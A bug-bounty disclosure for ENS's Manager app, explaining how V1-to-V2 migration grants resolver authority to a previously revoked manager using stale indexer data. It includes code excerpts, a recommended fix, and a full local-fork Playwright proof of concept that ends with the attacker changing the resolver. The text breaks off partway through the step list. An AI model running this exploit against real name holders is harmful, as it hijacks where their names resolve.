# 90002 w a medium manager grants v2 role set resolver from unverified v1 manager state restoring authority to a revoked manager during migration

## #90002 \[W\&A-Medium] Manager grants V2 \`ROLE\_SET\_RESOLVER\` from unverified V1 manager state, restoring authority to a revoked manager during migration

**Submitted on Aug 22nd 2026 at 12:17:31 UTC by @Petrate for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90002
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

### Description

### Brief / Intro

The Manager V1-to-V2 migration flow can restore resolver-management authority to a former V1 manager after that manager has already been revoked on the authoritative V1 Registry.

The affected state is an unwrapped `.eth` name where the victim remains the BaseRegistrar registrant, but a separate address was previously assigned as the V1 Registry owner/manager:

```
BaseRegistrar registrant = victim
V1 Registry manager      = attacker
```

The victim later revokes that manager on-chain and restores the authoritative V1 Registry owner to the victim.

Manager can still construct and execute the migration from an earlier V1 domain snapshot containing the old manager address. The migration path performs live ownership, approval, deployment, and retry checks, but it does not re-read the authoritative current V1 Registry `owner(node)` and compare it with the stored `managerAddress` before granting persistent V2 manager authority.

The stale manager address is therefore carried into the migration and granted:

```
ROLE_SET_RESOLVER = 1 << 24
```

on the migrated V2 name.

The passing PoC demonstrates the exact consequence:

```
attacker is a legitimate historical V1 manager
-> victim revokes attacker before migration
-> Manager consumes stale indexed manager state
-> normal Manager migration succeeds
-> revoked attacker receives V2 ROLE_SET_RESOLVER
-> revoked attacker successfully changes the migrated resolver
```

The PoC does **not** demonstrate ENS token theft, transfer of name ownership, or direct theft of user funds. The demonstrated impact is unauthorized resolver authority restored during V1-to-V2 migration.

***

## Root Cause with affected files

### Stale-state prerequisite — Manager accepts mutable indexed V1 manager state that may remain fresh for five minutes

In:

```
apps/manager/src/features/migration/hooks/useV1Names.ts:17-22
```

Manager fetches V1 names through `getV1NamesForAddress()` and allows that response to remain fresh for five minutes:

```ts
queryKey: qk('migration', 'v1_names', {
  address: address?.toLowerCase(),
}),
queryFn:
  enabled && address ? () => getV1NamesForAddress(address) : skipToken,
staleTime: 5 * 60 * 1000,
```

This is **not itself the vulnerability**. The security issue is that mutable manager information from this non-authoritative snapshot is later accepted as authorization input without being revalidated against current V1 Registry state.

The PoC deterministically reproduces the stale-data condition by returning the historical manager in the V1 subgraph response after the authoritative on-chain revocation.

The ENS subgraph/indexer is not the reported vulnerable component.

***

### Root cause 1 — “Fresh” migration preflight recomputes from the same supplied V1 domain snapshot

In:

```
apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts
```

the gas-estimate path requests a preflight with `staleTime: 0`:

```ts
const preflight = await ensurePreflight(domains, { staleTime: 0 })

const plan = await buildMigrationPlan({
  domains,
  hcaAddress,
  migrationOwner: ownerAddress,
  publicClient: publicClient as unknown as PublicClient,
  preflight,
})
```

However, `domains` is the V1 domain array already supplied to the hook. `staleTime: 0` causes the preflight computation to run again; it does not independently refresh the security-sensitive manager source.

In:

```
apps/manager/src/features/migration/service/computeMigrationPreflight.ts:199-206
```

the preflight classifies the supplied array directly:

```ts
const { eoa, hcaAddress, domains, wagmiConfig, publicClient } = params

const { classified } = classifyNames([...domains], eoa)
const groups = groupClassifiedNames(classified)

const needs = approvalNeedsFor(groups)
const requiresManagerRestoration = classified.some(
  (name) => name.managerAddress !== null,
)
```

For the unwrapped `.eth` case, the supporting classifier derives `managerAddress` from the V1 Registry owner contained in that supplied domain object when it differs from the BaseRegistrar registrant:

```
packages/migration/src/service/classifyNames.ts:159-167
```

Conceptually:

```ts
const tokenHolder = toAddress(registrant.id)
const registryOwnerAddress = toAddress(domain.owner.id)

const managerAddress =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

Therefore:

```
stale domain.owner = attacker
-> classifyNames(stale domains)
-> managerAddress = attacker
```

even though authoritative V1 Registry state has already changed.

The live eligibility path does check ownership of an unwrapped `.eth` through the BaseRegistrar token owner, which is still the victim in the PoC. It does **not** use that check to establish that the snapshotted `managerAddress` still equals the current V1 Registry `owner(node)`.

This allows both facts to be true:

```
current BaseRegistrar registrant = victim
stored managerAddress            = revoked attacker
```

and the name remains migration-eligible.

***

### Root cause 2 — Final execution checks refresh approval/retry state, but never revalidate the current V1 Registry manager

The final UI action in:

```
apps/manager/src/features/migration/pages/MigrationPage.tsx:259-278
```

executes the plan already produced by the gas-estimate path:

```ts
if (gasEstimate.status !== 'ready') return false

...

uiActor.send({
  type: 'migration.start',
  plan: gasEstimate.plan,
  signer,
  hcaClient,
  refreshAccount,
})
```

There is no authoritative V1 Registry-manager read at this final UI boundary.

The execution service does perform freshness checks, but they cover different state.

#### `assertMigrationApprovalPlanCurrent()` checks approval keys only

In:

```
apps/manager/src/features/migration/service/migrationService.ts:367-390
```

the function recomputes missing migration approvals and compares the planned and current approval keys:

```ts
const assertMigrationApprovalPlanCurrent = async (params: {
  readonly ctx: MigrationCtx
  readonly plan: MigrationPlan
}): Promise<readonly MigrationApproval[]> => {
  const missing = await getMissingMigrationApprovals(params)

  const plannedApprovalKeys = sortedApprovalKeys(
    params.plan.preflight.migrationApprovals ?? [],
  )
  const currentApprovalKeys = sortedApprovalKeys(missing)

  const matches =
    plannedApprovalKeys.length === currentApprovalKeys.length &&
    plannedApprovalKeys.every(
      (approvalKey, index) => approvalKey === currentApprovalKeys[index],
    )

  if (!matches) {
    throw new MigrationPlanChangedError(...)
  }

  return missing
}
```

This detects changes in the migration permission requirements.

It does **not**:

```
re-fetch V1 domains
re-run manager classification from authoritative Registry state
read V1Registry.owner(node)
compare current Registry manager with plan.classified.managerAddress
```

#### `prepareExecutionPlan()` reconciles previous submissions/retries, not source authority

In:

```
apps/manager/src/features/migration/service/migrationService.ts:974-1038
```

`prepareExecutionPlan()` starts with the existing `MigrationPlan`:

```ts
const journalReconciliation = await reconcileSubmittedAtomicBatches({
  ctx: params.ctx,
  plan: params.plan,
  allowStateFallback: params.reconcileBeforeSubmit,
})

const recoveredSubmissions = journalReconciliation.recovered
const recoveredNames = recoveredSubmissions.flatMap(({ names }) => names)

let executionPlan = adjustPlanForRetry(params.plan, recoveredNames)
```

When retry reconciliation is needed, it removes names that are already complete and returns an adjusted plan.

This protects migration retry/journal behavior, but it does not refresh the V1 Registry manager for names that remain in the plan.

The execution sequence then uses these two functions immediately before migration:

```
apps/manager/src/features/migration/service/migrationService.ts:1161-1179
```

Equivalent source flow:

```ts
const executionPlan = await prepareExecutionPlan({
  reconcileBeforeSubmit: params.reconcileBeforeSubmit ?? false,
  publicClient,
  plan,
  ctx,
  onBatchComplete,
})

if (executionPlan.classified.length > 0) {
  const currentMissing = params.reconcileBeforeSubmit
    ? undefined
    : await assertMigrationApprovalPlanCurrent({
        ctx,
        plan: executionPlan,
      })

  ...
}
```

The code comment correctly says permission state is mutable and should be checked before the wallet prompt, but the check being performed is the approval-plan check above.

No `V1Registry.owner(node)` comparison is made before the stale manager reaches execution.

The effective path is therefore:

```
stale V1 domains
-> preflight recomputes from stale domains
-> gasEstimate.plan stores stale managerAddress
-> final UI sends gasEstimate.plan
-> prepareExecutionPlan reconciles journal/retry state
-> assertMigrationApprovalPlanCurrent checks approval keys
-> stale managerAddress remains unchanged
```

***

### Root cause 3 — Manager converts the unverified `managerAddress` directly into persistent V2 resolver authority

In:

```
apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9-23
```

Manager defines:

```ts
const ROLE_SET_RESOLVER = 1n << 24n
```

and grants it directly to the classified manager:

```ts
export const buildRoleGrantCall = (name: ClassifiedName): Call => {
  if (!name.managerAddress) {
    throw new Error(`No manager address for ${name.domain.name}`)
  }

  const resource = labelToCanonicalId(name.label)

  return {
    to: V2_CONTRACTS.ETHRegistry,
    data: encodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      functionName: 'grantRoles',
      args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
    }),
    value: 0n,
  }
}
```

The atomic migration builder explicitly schedules and verifies this grant whenever `classified.managerAddress` is present:

```
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-623
```

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })

  verificationExpectations.push({
    id: expectationId(name, 'manager-role'),
    type: 'manager-role',
    name,
    label: classified.label,
    registry: V2_CONTRACTS.ETHRegistry,
    resource: labelToCanonicalId(classified.label),
    account: classified.managerAddress,
    roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

The migration therefore does not merely carry the stale value as metadata.

It converts that address into a verified persistent V2 authorization:

```
unverified V1 managerAddress
-> grantRoles(resource, ROLE_SET_RESOLVER, managerAddress)
-> verify the same address received ROLE_SET_RESOLVER
```

That is the security boundary violation demonstrated by the PoC.

***

## Impact path

1. The victim owns an unwrapped V1 `.eth` BaseRegistrar token.
2. The attacker is legitimately assigned as the V1 Registry manager.
3. Manager's V1 data source contains that legitimate manager relationship.
4. The victim revokes the attacker on the authoritative V1 Registry while remaining the BaseRegistrar registrant.
5. Manager operates on a stale V1 domain snapshot that still contains:

```
manager = attacker
```

6. The gas-estimate/preflight flow recomputes the migration from that same supplied snapshot.
7. The current BaseRegistrar ownership check succeeds because the victim still owns the registration.
8. No execution-time check compares the stored `managerAddress` with current authoritative `V1Registry.owner(node)`.
9. The victim confirms the normal V1-to-V2 migration.
10. Migration succeeds.
11. Manager executes:

```
grantRoles(resource, ROLE_SET_RESOLVER, attacker)
```

12. The revoked attacker now holds:

```
16777216 = 1 << 24 = ROLE_SET_RESOLVER
```

on the migrated V2 resource.

13. The attacker calls V2 `setResolver()`.
14. The transaction succeeds and changes the active resolver.

In the validated passing PoC:

```
resolver before attacker action:
0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0

resolver after attacker action:
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

The report does **not** claim that the attacker becomes the token owner or that the PoC demonstrates direct theft of funds.

The demonstrated consequence is that an actor whom the victim revoked before migration regains persistent resolver-management authority and successfully points the migrated name's active resolver to the attacker's own EOA after migration.

***

## Recommendation Fix

Treat the manager that will receive persistent V2 authorization as an **execution-time authoritative value**.

For each unwrapped `.eth` name that has a non-null planned `managerAddress`, immediately before the persistent V2 role grant is authorized:

1. read the current BaseRegistrar registrant;
2. read the current authoritative V1 Registry `owner(node)`;
3. derive the current manager relationship from those values;
4. compare the result with the `managerAddress` stored in the migration plan;
5. invalidate/rebuild the plan if they differ;
6. fail closed if the authoritative read cannot be completed.

Conceptually:

```
currentRegistrant = BaseRegistrar.ownerOf(labelHash)
currentRegistryOwner = V1Registry.owner(node)

currentManager =
    currentRegistryOwner != currentRegistrant
        ? currentRegistryOwner
        : null

if currentManager != plan.classified.managerAddress:
    invalidate/rebuild migration plan
```

This check should occur at the same authority boundary where Manager already verifies mutable approval state before execution.

A regression test should cover:

```
victim = BaseRegistrar registrant
attacker = legitimate V1 Registry manager
-> migration state contains attacker
-> victim revokes attacker
-> migration execution starts
```

Secure behavior should be either:

```
plan invalidated and rebuilt from current manager state
```

or:

```
migration fails closed and requires the user to review refreshed state
```

with the final postcondition:

```
revoked attacker does not receive ROLE_SET_RESOLVER
```

### Link to Proof of Concept

<https://gist.github.com/devpetrate/cbee9e48803e86c22ed3340657e57e39>

### Proof of Concept

### Proof of Concept

The full PoC source is supplied separately and should be pasted into `e2e/projects/manager/tests/poc-stale-v1-manager.spec.ts`.

### PoC type and scope

This PoC is a **deterministic local-fork Manager E2E reproduction with one mocked external stale-data condition**.

The following parts are real:

```
canonical V1 BaseRegistrar registration
authoritative V1 Registry manager assignment
authoritative V1 Registry manager revocation
active V2 premigration reservation
real Manager frontend
real Manager eligibility
real migration-plan construction
real wallet confirmation path
real migration execution
real V2 role assignment
real attacker setResolver transaction
real final V2 resolver state
```

The only mocked application dependency is the V1 subgraph HTTP response.

After the attacker is revoked on-chain, that response continues to return the historical manager value so the stale-data condition is deterministic.

The local-fork fixture also uses privileged Anvil test operations to create valid prerequisite state, including temporary V1 controller authorization, V2 registrar impersonation for reservation, test-account balance setup, and clearing code at the deterministic attacker fixture address. These are test-environment setup operations, not mocked Manager authorization checks, and none of them grants the attacker the disputed V2 `ROLE_SET_RESOLVER`.

The PoC does **not** claim to prove a particular production subgraph lag duration.

The vulnerability being demonstrated is Manager's behavior once its V1 view is stale:

```
stale non-authoritative manager value
-> no authoritative Registry-manager revalidation
-> persistent V2 authority granted
```

The ENS subgraph/indexer itself is not being reported as vulnerable.

#### Source/output consistency

The submitted PoC source and the validated output correspond to the same final version:

```
attacker.address =
0x70997970C51812dc3A010C7d01b50e0d17dc79C8

setResolver(resource, attacker.address)

final resolver =
0x70997970C51812dc3A010C7d01b50e0d17dc79C8
```

The PoC also clears code at the deterministic local attacker address and asserts that the address has no code before the terminal `setResolver()` call, so the final state points the name at an attacker-controlled EOA rather than a resolver contract.

### Setup

Use the repository's existing Manager E2E environment.

The PoC uses:

```
Anvil Sepolia fork
canonical V1 BaseRegistrar
authoritative V1 Registry
active V2 Registry / Registrar
Manager frontend in CI mode
existing Playwright wallet fixtures
```

Frontend:

```bash
VITE_DQA=0 pnpm --filter manager exec vite dev --mode ci
```

PoC location:

```
e2e/projects/manager/tests/poc-stale-v1-manager.spec.ts
```

The PoC modifies no production source files.

### Exact command

```bash
pnpm --filter @ens-apps/e2e exec playwright test \
  projects/manager/tests/poc-stale-v1-manager.spec.ts \
  --config=projects/manager/playwright.config.ts
```

### PoC:

```ts
import { extendChainWithEns, getChainContractAddress } from "@ensdomains/ensjs/chain";
import { labelToCanonicalId } from "@ensdomains/ensjs/utils/v2";
import { encodeFunctionData, keccak256, namehash, parseAbi, toHex, zeroAddress } from "viem";
import { sepolia } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";
import { authorizeTransactionsWhile, expect, test } from "../../../fixtures/playwright.manager.fixture.js";
import { publicClient, testClient, walletClient } from "../../../helpers/anvil-client.js";
const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? "http://localhost:3000";

// Resolve the canonical V1 BaseRegistrar from the exact ENSJS Sepolia manifest
// used by Manager's migration eligibility checks. Do not use the stale
// makeV1Name.ts fixture deployment here.
const canonicalSepolia = extendChainWithEns(sepolia);
const V1_BASE_REGISTRAR = getChainContractAddress({
  chain: canonicalSepolia,
  contract: "ensBaseRegistrarImplementation",
});
const V1_PUBLIC_RESOLVER = "0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5" as const;

// Resolve V2 from the same ENSJS Sepolia manifest used by migration preflight
// and the smart-account destination manifest. Do not use the retired E2E V2
// deployment hardcoded by older migration fixtures/assertion helpers.
const V2_ETH_REGISTRY = getChainContractAddress({
  chain: canonicalSepolia,
  contract: "ensRegistry",
});
const V2_ETH_REGISTRAR = getChainContractAddress({
  chain: canonicalSepolia,
  contract: "ensEthRegistrar",
});

const ROLE_SET_RESOLVER = 1n << 24n;
const ONE_YEAR = 365n * 24n * 60n * 60n;

const V1_REGISTRY_ABI = parseAbi(["function owner(bytes32 node) view returns (address)"]);

const V1_BASE_REGISTRAR_ABI = parseAbi([
  "function owner() view returns (address)",
  "function ens() view returns (address)",
  "function controllers(address controller) view returns (bool)",
  "function addController(address controller)",
  "function removeController(address controller)",
  "function register(uint256 id, address owner, uint256 duration) returns (uint256)",
  "function ownerOf(uint256 id) view returns (address)",
  "function reclaim(uint256 id, address owner)",
  "function nameExpires(uint256 id) view returns (uint256)",
]);

const V2_REGISTRY_ABI = parseAbi([
  "function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)",
  "function getStatus(uint256 anyId) view returns (uint8)",
  "function getResolver(string label) view returns (address)",
  "function roles(uint256 labelHash, address account) view returns (uint256)",
  "function setResolver(uint256 anyId, address resolver)",
]);

async function waitForSuccessfulReceipt(hash: `0x${string}`, step: string) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash });
  expect(receipt.status, `${step} transaction must succeed before the PoC can continue`).toBe("success");
  console.log(`[PoC] ${step} receipt: success (${hash})`);
  return receipt;
}

function v2LabelHash(label: string): bigint {
  return BigInt(keccak256(toHex(label)));
}

async function readV2Status(label: string) {
  return publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2_REGISTRY_ABI,
    functionName: "getStatus",
    args: [v2LabelHash(label)],
  });
}

async function assertV2Reserved(label: string) {
  const status = await readV2Status(label);
  expect(status, `Expected ${label}.eth to be RESERVED (1) in active V2, got ${status}`).toBe(1);
}

async function assertV2Registered(label: string) {
  const status = await readV2Status(label);
  expect(status, `Expected ${label}.eth to be REGISTERED (2) in active V2, got ${status}`).toBe(2);
}

async function assertHasRoles(label: string, account: `0x${string}`, expectedRoles: bigint) {
  const actualBitmap = await publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2_REGISTRY_ABI,
    functionName: "roles",
    args: [v2LabelHash(label), account],
  });
  const missing = expectedRoles & ~actualBitmap;
  expect(
    missing,
    `Account ${account} is missing roles 0x${missing.toString(16)} on ${label}.eth ` +
      `(actual=0x${actualBitmap.toString(16)}, expected=0x${expectedRoles.toString(16)})`,
  ).toBe(0n);
}

async function readV2Resolver(label: string) {
  return publicClient.readContract({
    address: V2_ETH_REGISTRY,
    abi: V2_REGISTRY_ABI,
    functionName: "getResolver",
    args: [label],
  });
}

async function assertV2Resolver(label: string, expectedResolver: `0x${string}`) {
  const resolver = await readV2Resolver(label);
  expect(resolver.toLowerCase()).toBe(expectedResolver.toLowerCase());
}

async function reserveV2NameStrict(label: string, expiry: bigint) {
  const statusBefore = await readV2Status(label);
  expect(statusBefore, `${label}.eth must start AVAILABLE before the PoC reserves it`).toBe(0);

  await testClient.impersonateAccount({ address: V2_ETH_REGISTRAR });
  try {
    // The baked registrar has protocol authority but is not a funded test EOA.
    // Give the impersonated sender gas only; this does not alter registry roles.
    await testClient.setBalance({
      address: V2_ETH_REGISTRAR,
      value: 1_000_000_000_000_000_000n,
    });

    const reserveHash = await walletClient.sendTransaction({
      account: V2_ETH_REGISTRAR,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: V2_REGISTRY_ABI,
        functionName: "register",
        args: [label, zeroAddress, zeroAddress, V1_PUBLIC_RESOLVER, 0n, expiry],
      }),
      gas: 500_000n,
    });
    await waitForSuccessfulReceipt(reserveHash, "V2 reserve");
  } finally {
    await testClient.stopImpersonatingAccount({
      address: V2_ETH_REGISTRAR,
    });
  }

  await assertV2Reserved(label);
  console.log(`[PoC] strict V2 reservation confirmed: ${label}.eth`);
}

async function isCanonicalV1Controller(controller: `0x${string}`) {
  return publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: "controllers",
    args: [controller],
  });
}

async function setCanonicalV1Controller(controller: `0x${string}`, enabled: boolean) {
  const registrarOwner = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: "owner",
  });
  expect(registrarOwner).not.toBe(zeroAddress);

  await testClient.impersonateAccount({ address: registrarOwner });
  try {
    await testClient.setBalance({
      address: registrarOwner,
      value: 1_000_000_000_000_000_000n,
    });

    const data = enabled
      ? encodeFunctionData({
          abi: V1_BASE_REGISTRAR_ABI,
          functionName: "addController",
          args: [controller],
        })
      : encodeFunctionData({
          abi: V1_BASE_REGISTRAR_ABI,
          functionName: "removeController",
          args: [controller],
        });
    const hash = await walletClient.sendTransaction({
      account: registrarOwner,
      to: V1_BASE_REGISTRAR,
      data,
      gas: 200_000n,
    });
    await waitForSuccessfulReceipt(hash, `canonical V1 controller ${enabled ? "grant" : "restore"}`);
  } finally {
    await testClient.stopImpersonatingAccount({ address: registrarOwner });
  }

  expect(await isCanonicalV1Controller(controller)).toBe(enabled);
  return registrarOwner;
}

async function registerV1NameStrict(victim: ReturnType<typeof privateKeyToAccount>) {
  const label = `poc-stale-manager-${Date.now()}`;
  const v1Name = `${label}.eth`;
  const node = namehash(v1Name);
  const tokenId = BigInt(keccak256(toHex(label)));
  const v1Registry = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: "ens",
  });
  expect(v1Registry).not.toBe(zeroAddress);

  // The canonical Sepolia V1 controllers were revoked during the V2 cutover.
  // For this local fork only, temporarily authorize the victim as a controller
  // so we can seed one real V1 token on the exact registrar production
  // eligibility reads. Restore the prior controller state immediately after.
  const controllerWasEnabled = await isCanonicalV1Controller(victim.address);
  let registrarOwner: `0x${string}` | null = null;
  if (!controllerWasEnabled) {
    registrarOwner = await setCanonicalV1Controller(victim.address, true);
  }

  try {
    const registerHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: "register",
        args: [tokenId, victim.address, ONE_YEAR],
      }),
      gas: 500_000n,
    });
    await waitForSuccessfulReceipt(registerHash, "canonical V1 register");
  } finally {
    if (!controllerWasEnabled) {
      await setCanonicalV1Controller(victim.address, false);
    }
  }

  expect(await isCanonicalV1Controller(victim.address)).toBe(controllerWasEnabled);
  if (registrarOwner) {
    console.log(`[PoC] canonical BaseRegistrar owner: ${registrarOwner}`);
  }

  const expiry = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: "nameExpires",
    args: [tokenId],
  });
  const block = await publicClient.getBlock();
  expect(expiry > block.timestamp).toBe(true);

  const baseOwner = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: "ownerOf",
    args: [tokenId],
  });
  expect(baseOwner.toLowerCase()).toBe(victim.address.toLowerCase());

  const registryOwner = await publicClient.readContract({
    address: v1Registry,
    abi: V1_REGISTRY_ABI,
    functionName: "owner",
    args: [node],
  });
  expect(registryOwner.toLowerCase()).toBe(victim.address.toLowerCase());

  console.log(`[PoC] strict canonical V1 registration confirmed: ${v1Name}`);
  console.log(`[PoC] canonical BaseRegistrar: ${V1_BASE_REGISTRAR}`);
  console.log(`[PoC] canonical V1 Registry: ${v1Registry}`);
  console.log(`[PoC] BaseRegistrar owner: ${baseOwner}`);
  console.log(`[PoC] initial Registry owner: ${registryOwner}`);
  console.log(`[PoC] V1 expiry: ${expiry}`);

  // MigrationHelper requires the corresponding V2 RESERVED slot.
  // Do not use the shared reserveInV2() helper here: its broad error catch can
  // mislabel a failed reservation as "already RESERVED".
  await reserveV2NameStrict(label, expiry);

  return { label, v1Name, node, tokenId, expiry, v1Registry };
}

test.describe("P0-L3A stale V1 manager migration PoC", () => {
  test.describe.configure({ timeout: 300_000 });

  test("revoked V1 manager is restored as V2 resolver manager", async ({
    migrationConnectedPage: page,
    wallet,
    accounts,
  }) => {
    const victim = privateKeyToAccount(accounts.getPrivateKey("user"));
    const attacker = privateKeyToAccount(accounts.getPrivateKey("user2"));

    // A Sepolia fork can contain code at deterministic Anvil addresses.
    // Ensure the attacker fixture account behaves as a normal EOA.
    await testClient.setCode({ address: attacker.address, bytecode: "0x" }).catch(() => {});

    const { label, v1Name, node, tokenId, expiry, v1Registry } = await registerV1NameStrict(victim);
    const resource = labelToCanonicalId(label);

    console.log(`[PoC] victim:   ${victim.address}`);
    console.log(`[PoC] attacker: ${attacker.address}`);
    console.log(`[PoC] name:     ${v1Name}`);

    // Historical legitimate state. BaseRegistrar.reclaim() changes the V1
    // Registry manager but does not transfer the ERC-721 registration.
    const assignManagerHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: "reclaim",
        args: [tokenId, attacker.address],
      }),
    });
    await waitForSuccessfulReceipt(assignManagerHash, "historical manager assignment");

    const historicalManager = await publicClient.readContract({
      address: v1Registry,
      abi: V1_REGISTRY_ABI,
      functionName: "owner",
      args: [node],
    });
    expect(historicalManager.toLowerCase()).toBe(attacker.address.toLowerCase());

    const baseOwnerAfterAssignment = await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: V1_BASE_REGISTRAR_ABI,
      functionName: "ownerOf",
      args: [tokenId],
    });
    expect(baseOwnerAfterAssignment.toLowerCase()).toBe(victim.address.toLowerCase());
    console.log(`[PoC] historical Registry manager: ${historicalManager}`);
    console.log(`[PoC] BaseRegistrar registrant remains victim: ${baseOwnerAfterAssignment}`);

    // Freeze the external V1 view at the historical manager state.
    await page.route("**/v1-graphql.ens.dev/subgraph", async (route, request) => {
      const postData = request.postData() ?? "";

      if (postData.includes("getProfilesForDomains")) {
        return route.fulfill({
          status: 200,
          contentType: "application/json",
          body: JSON.stringify({
            data: {
              domains: [
                {
                  id: node,
                  resolver: {
                    texts: [],
                    coinTypes: [],
                    contentHash: null,
                    abiChangeds: [],
                  },
                },
              ],
            },
          }),
        });
      }

      if (!postData.includes("getNamesForAddress")) {
        return route.continue();
      }

      console.log(`[PoC] serving stale indexed manager ${attacker.address} for ${v1Name}`);
      return route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          data: {
            domains: [
              {
                id: node,
                labelName: label,
                labelhash: keccak256(toHex(label)),
                name: v1Name,
                resolver: null,
                owner: { id: attacker.address.toLowerCase() },
                registrant: { id: victim.address.toLowerCase() },
                wrappedOwner: null,
                parent: {
                  name: "eth",
                  wrappedDomain: null,
                },
                registration: {
                  expiryDate: expiry.toString(),
                },
                wrappedDomain: null,
              },
            ],
          },
        }),
      });
    });

    // Revoke the attacker in authoritative V1 state BEFORE migration.
    const revokeHash = await walletClient.sendTransaction({
      account: victim,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: "reclaim",
        args: [tokenId, victim.address],
      }),
    });
    await waitForSuccessfulReceipt(revokeHash, "manager revocation");

    const currentV1Manager = await publicClient.readContract({
      address: v1Registry,
      abi: V1_REGISTRY_ABI,
      functionName: "owner",
      args: [node],
    });
    expect(currentV1Manager.toLowerCase()).toBe(victim.address.toLowerCase());
    expect(currentV1Manager.toLowerCase()).not.toBe(attacker.address.toLowerCase());

    const baseOwnerAfterRevocation = await publicClient.readContract({
      address: V1_BASE_REGISTRAR,
      abi: V1_BASE_REGISTRAR_ABI,
      functionName: "ownerOf",
      args: [tokenId],
    });
    expect(baseOwnerAfterRevocation.toLowerCase()).toBe(victim.address.toLowerCase());
    console.log(`[PoC] authoritative Registry manager after revocation: ${currentV1Manager}`);
    console.log(`[PoC] attacker is revoked before migration begins`);

    // Drive the normal Manager migration UI.
    await page.goto(`${MANAGER_APP_URL}/dashboard`);
    await page.waitForLoadState("networkidle");

    const upgradeButton = page.getByRole("button", { name: "Upgrade Names" }).first();
    await upgradeButton.waitFor({ state: "visible", timeout: 20_000 });
    await upgradeButton.click();
    await page.waitForTimeout(2_000);

    const confirmButton = page.getByRole("button", {
      name: /^Upgrade \d+ names?$/,
    });
    await confirmButton.waitFor({ state: "visible", timeout: 20_000 });

    let migrationDone = false;
    // Current Manager success UI. Match the heading rather than stale copy so
    // this PoC remains tied to the successful migration state, not old wording.
    const successIndicator = page.getByRole("heading", {
      name: /^Your names? (?:has|have) been upgraded!$/i,
    });

    await Promise.all([
      (async () => {
        await confirmButton.click();
        await successIndicator.waitFor({ state: "visible", timeout: 120_000 });
        migrationDone = true;
      })(),
      authorizeTransactionsWhile(page, wallet, () => migrationDone),
    ]);

    await assertV2Registered(label);
    console.log(`[PoC] migration completed`);

    // Vulnerable result: a manager revoked before migration is recreated in V2.
    await assertHasRoles(label, attacker.address, ROLE_SET_RESOLVER);
    console.log(`[PoC] attacker regained ROLE_SET_RESOLVER after being revoked before migration`);

    // Terminal impact: prove the revoked manager can point the migrated name's
    // active resolver directly at an attacker-controlled EOA. This is not a
    // resolver contract, so it also demonstrates the competition's
    // "hijacking or bricking an ENS name during migration" impact.
    const attackerCode = await publicClient.getCode({
      address: attacker.address,
    });
    expect(attackerCode ?? "0x").toBe("0x");

    const resolverBeforeAttack = await readV2Resolver(label);
    expect(resolverBeforeAttack.toLowerCase()).not.toBe(attacker.address.toLowerCase());
    console.log(`[PoC] resolver before attacker mutation: ${resolverBeforeAttack}`);

    const setResolverHash = await walletClient.sendTransaction({
      account: attacker,
      to: V2_ETH_REGISTRY,
      data: encodeFunctionData({
        abi: V2_REGISTRY_ABI,
        functionName: "setResolver",
        args: [resource, attacker.address],
      }),
    });
    await waitForSuccessfulReceipt(setResolverHash, "attacker V2 setResolver");

    await assertV2Resolver(label, attacker.address);
    console.log(
      `[PoC] SUCCESS: revoked attacker changed the migrated V2 resolver to attacker-controlled EOA ${attacker.address}`,
    );
  });
});

```

### Step-by-step attack

1. Register a fresh unwrapped `.eth` name using the canonical V1 BaseRegistrar on the local Sepolia fork.
2. Verify that the victim owns the BaseRegistrar token and is initially the authoritative V1 Registry owner.
3. Create the required premigration reservation in the active V2 Registry used by Manager.
4. Assign the attacker as the V1 Registry owner/manager while leaving BaseRegistrar ownership with the victim.
5. Verify:

```
historical V1 Registry manager = attacker
BaseRegistrar registrant       = victim
```

6. Revoke the attacker by restoring authoritative V1 Registry ownership to the victim.
7. Before migration begins, verify:

```
authoritative V1 Registry manager = victim
BaseRegistrar registrant          = victim
```

8. Intercept Manager's V1 subgraph request for the PoC name and return the historical pre-revocation manager:

```
indexed manager = attacker
```

